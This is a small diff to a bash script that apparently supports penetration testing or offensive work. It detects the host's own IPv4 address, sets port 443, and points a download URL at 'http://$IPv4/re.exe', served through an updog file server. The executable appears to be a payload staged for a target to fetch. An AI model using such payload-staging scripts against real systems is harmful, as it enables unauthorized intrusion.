@@ -341,9 +341,11 @@ function urlencodeme() {
 if [[ $OS == "Darwin" ]]
 then
      myip=$(ipconfig getifaddr en0)
+     IPv4=$myip
 else
     int=$(route | grep '^default' | grep -o '[^ ]*$')
     myip=$(ip -4 a show dev $int |grep inet|awk -F "inet" {'print $2'}|cut -d/ -f1 | xargs)
+    IPv4=$myip
 fi
 
 myport="443"
@@ -656,8 +658,8 @@ fi
 action=$1
 proto=$2
 
-
-        url="http://$IP/re.exe" 
+        
+        url="http://$IPv4/re.exe" 
         
             if [ $(ps -ef | grep -c updog) == 2 ]
             then
